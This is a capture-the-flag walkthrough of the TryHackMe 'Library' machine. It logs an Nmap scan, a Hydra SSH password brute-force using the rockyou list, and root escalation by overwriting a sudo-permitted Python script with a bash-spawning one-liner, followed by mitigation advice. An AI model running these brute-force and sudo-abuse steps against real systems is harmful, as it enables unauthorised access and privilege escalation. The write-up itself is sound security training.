# Library CTF – TryHackMe VAPT Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** October 15, 2025  
**Difficulty:** Medium  
**Category:** Brute-Force & Privilege Escalation  
**Platform:** Custom CTF (Based on Provided Logs)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open services, potential usernames, and entry points on the target machine.
- **Commands Used and Outputs:**  
  - Port scanning with Nmap:  
    ```
    nmap 10.201.5.107 -v
    ```
    **Output Explanation:**  
    ```
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 19:31 IST
    Initiating Ping Scan at 19:31
    Scanning 10.201.5.107 [4 ports]
    Completed Ping Scan at 19:31, 0.43s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 19:31
    Completed Parallel DNS resolution of 1 host. at 19:31, 0.00s elapsed
    Initiating SYN Stealth Scan at 19:31
    Scanning 10.201.5.107 [1000 ports]
    Discovered open port 22/tcp on 10.201.5.107
    Discovered open port 80/tcp on 10.201.5.107
    Completed SYN Stealth Scan at 19:31, 3.95s elapsed (1000 total ports)
    Nmap scan report for 10.201.5.107
    Host is up (0.39s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Read data files from: /usr/share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 4.48 seconds
               Raw packets sent: 1088 (47.848KB) | Rcvd: 1085 (43.408KB)
    ```
    This scan uses SYN stealth mode to probe the top 1000 ports. It confirms the host is alive (via ping) and identifies SSH (remote access) and HTTP (web server) as potential attack vectors. The verbose flag provides detailed progress, and no version detection was needed initially.

  - Web access to `/robots.txt` (via browser or curl, e.g., `curl http://10.201.5.107/robots.txt`).  
    **Output Explanation:**  
    ```
    User-agent: rockyou 
    Disallow: /
    ```
    Robots.txt is a file that instructs search engines on crawlable paths. Here, it references "rockyou" (a famous password wordlist), hinting at its use for brute-forcing. The Disallow: / suggests the site is not meant for indexing, but the user-agent entry leaks tool information.

- **Findings:**
  - Open ports: 22 (SSH) and 80 (HTTP).
  - Username hint: "melodias" from a blog post on the web page (accessed via browser), likely a variant of "meliodas".
  - No additional web vulnerabilities noted; focus shifted to SSH based on hints.

---

## 2. Exploitation Process

### Step 1 – Network and Web Enumeration
- As detailed in reconnaissance, Nmap and robots.txt provided service and tool hints. Blog post yielded username "meliodas".

### Step 2 – SSH Brute-Force
- Hydra brute-force:  
  ```
  hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -s 22 10.201.5.107 ssh -t 4
  ```
  **Output Explanation:**  
  ```
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-15 20:09:56
  [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
  [DATA] attacking ssh://10.201.5.107:22/
  [STATUS] 57.00 tries/min, 57 tries in 00:01h, 14344342 to do in 4194:16h, 4 active
  [STATUS] 61.33 tries/min, 184 tries in 00:03h, 14344215 to do in 3897:54h, 4 active
  [22][ssh] host: 10.201.5.107   login: meliodas   password: [REDACTED]
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-15 20:14:01
  ```
  Hydra is a parallelized brute-forcer. -l specifies login (username), -P the password list (rockyou.txt with ~14 million entries), -s port 22, -t 4 limits to 4 threads to avoid overload. Status updates show progress; it found the match after ~184 tries. This exploits weak passwords from common lists.

- SSH login and user flag capture:  
  ```
  ssh meliodas@10.201.5.107
  ```
  **Output Explanation (Post-Authentication):**  
  ```
  The authenticity of host '10.201.5.107 (10.201.5.107)' can't be established.
  ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '10.201.5.107' (ED25519) to the list of known hosts.
  meliodas@10.201.5.107's password:
  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:    https://ubuntu.com/advantage
  Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
  meliodas@ubuntu:~$ ls
  bak.py  user.txt
  meliodas@ubuntu:~$ cat user.txt
  [REDACTED]
  ```
  SSH prompts for password (entered [REDACTED]). Upon login, ls lists files; cat reads the user flag file, proving initial access.

### Step 3 – Post-Exploitation Enumeration
- Script inspection and SUDO check:  
  ```
  cat bak.py
  ```
  **Output Explanation:**  
  ```
  #!/usr/bin/env python
  import os
  import zipfile

  def zipdir(path, ziph):
      for root, dirs, files in os.walk(path):
          for file in files:
              ziph.write(os.path.join(root, file))

  if __name__ == '__main__':
      zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
      zipdir('/var/www/html', zipf)
      zipf.close()
  ```
  This Python script creates a zip backup of the web directory—useful for understanding privileges.

  ```
  ls -lah
  ```
  **Output Explanation:**  
  ```
  total 40K
  drwxr-xr-x 4 meliodas meliodas 4.0K Aug 24  2019 .
  drwxr-xr-x 3 root     root     4.0K Aug 23  2019 ..
  -rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
  -rw------- 1 root     root       44 Aug 23  2019 .bash_history
  -rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
  -rw-r--r-- 1 meliodas meliodas 3.7K Aug 23  2019 .bashrc
  drwx------ 2 meliodas meliodas 4.0K Aug 23  2019 .cache
  drwxrwxr-x 2 meliodas meliodas 4.0K Aug 23  2019 .nano
  -rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
  -rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
  -rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
  ```
  Shows file permissions: bak.py is root-owned but in user dir (writable via overwrite if deleted).

  ```
  sudo -l
  ```
  **Output Explanation:**  
  ```
  Matching Defaults entries for meliodas on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User meliodas may run the following commands on ubuntu:
      (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
  ```
  Reveals NOPASSWD sudo for Python executing the script—key escalation vector.

### Step 4 – Privilege Escalation
- Script overwrite and execution:  
  ```
  rm bak.py
  echo  'import os; os.execl("/bin/bash", "bash", "-i")' > bak.py
  sudo python /home/meliodas/bak.py
  ```
  **Output Explanation:**  
  rm deletes original (prompt: y). echo writes malicious code to spawn bash. sudo runs it elevated, switching to root@ prompt.  
  Post-escalation:  
  ```
  root@ubuntu:~# ls
  bak.py  user.txt
  root@ubuntu:~# cd /root
  root@ubuntu:/root# ls
  root.txt
  root@ubuntu:/root# cat root.txt
  [REDACTED]
  ```
  Navigation and cat prove root access and flag capture.

---

## 3. Proof of Concept (PoC)

- **SSH Brute-Force PoC:**  
  - Hydra command as above; succeeds due to common password [REDACTED].
- **SUDO Script Injection PoC:**  
  - Overwrite bak.py with shell code and sudo execute. Demonstrates how user-writable paths in sudoers lead to escalation.

---

## 4. Privilege Escalation

- **Technique:** Abuse of SUDO NOPASSWD on user-controlled script path, injecting code to spawn root shell.
- **Details:** Wildcard and writability allow arbitrary execution.

---

## 5. Mitigation Recommendations

- **Credential Security:** Enforce strong, unique passwords; use SSH keys and fail2ban.
- **Information Disclosure:** Remove hints from web files.
- **SUDO Hardening:** No wildcards/NOPASSWD; root-own scripts.
- **File Permissions:** Audit writable files in privileged paths.
- **System Hardening:** Update OS; monitor logs.

---

## 6. Lessons Learned

- Web leaks accelerate attacks.
- SUDO misconfigs are critical vulnerabilities.
- Enumeration (sudo -l) is essential post-access.

---

## 7. Skills Practiced

- Scanning (Nmap), brute-forcing (Hydra).
- Linux enum (ls, cat, sudo).
- Escalation via injection.
